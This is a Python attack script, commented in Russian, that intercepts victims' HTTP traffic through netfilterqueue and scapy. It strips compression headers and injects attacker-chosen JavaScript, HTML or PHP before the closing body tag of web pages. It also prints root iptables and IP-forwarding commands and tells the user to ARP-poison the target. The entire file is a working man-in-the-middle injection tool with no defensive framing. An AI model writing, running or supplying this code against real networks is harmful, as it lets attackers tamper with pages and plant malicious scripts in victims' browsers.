import scapy.all as scapy
import netfilterqueue
import argparse
import re


# Получение аргументов
def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-f", "--file-to-inject", dest="file", help="Файл/код для внедрения", type=str)
    options = parser.parse_args()
    if not options.file:
        # код для обработки ошибки
        parser.error("\n[-] Пожалуйста, укажите допустимый файл с кодом, который будет внедряться (js, HTML, php).")
    File = open(options.file, 'r')
    f = File.readlines()
    code = ""
    for line in f:
        code += line.strip()
    return(code)

# Изменение загрузки пакетов
def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.TCP].chksum
    del packet[scapy.IP].chksum
    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        #print(scapy_packet.show())
        try:
            load = scapy_packet[scapy.Raw].load.decode()
            if scapy_packet[scapy.TCP].dport == 80:
                print("\n[+] Запрос от: " + scapy_packet[scapy.IP].src)
                load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
            elif scapy_packet[scapy.TCP].sport == 80:
                print("[+] Ответ от: " + scapy_packet[scapy.IP].src)
                injection_code = code
                # Добавление внедренного кода перед завершающим тегом </body>
                load = load.replace("</body>", injection_code + "</body>")
                # Поиск длины содержимого и замена
                content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
                if content_length_search and "text/html" in load:
                    content_length = content_length_search.group(1)
                    new_content_length = int(content_length) + len(injection_code)
                    load = load.replace(content_length, str(new_content_length))
            if load != scapy_packet[scapy.Raw].load:
                print("[!] Код внедрен!")
                new_packet = set_load(scapy_packet, load)
                packet.set_payload(bytes(new_packet))
        except UnicodeDecodeError:
            pass
    packet.accept()

print("[-] Укажите файл с кодом\n\n")
print("[ПРИМЕЧАНИЕ:] Чтобы перехватить целевую систему, ARP отравляет кэш цели, чтобы разрешить всем DNS-запросам проходить через этот компьютер\n\n")
print("""
[!] Запустите следующие команды с root правами, если не проходит атака:

1. iptables -I OUTPUT -j NFQUEUE --queue-num 0
2. iptables -I INPUT -j NFQUEUE --queue-num 0
3. echo 1 > /proc/sys/net/ipv4/ip_forward

""")

try:
    code = get_arguments()
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()
except KeyboardInterrupt:
    print("\n[-] Обнаружено CTRL + C ......\n\n\n Выходим из программы!")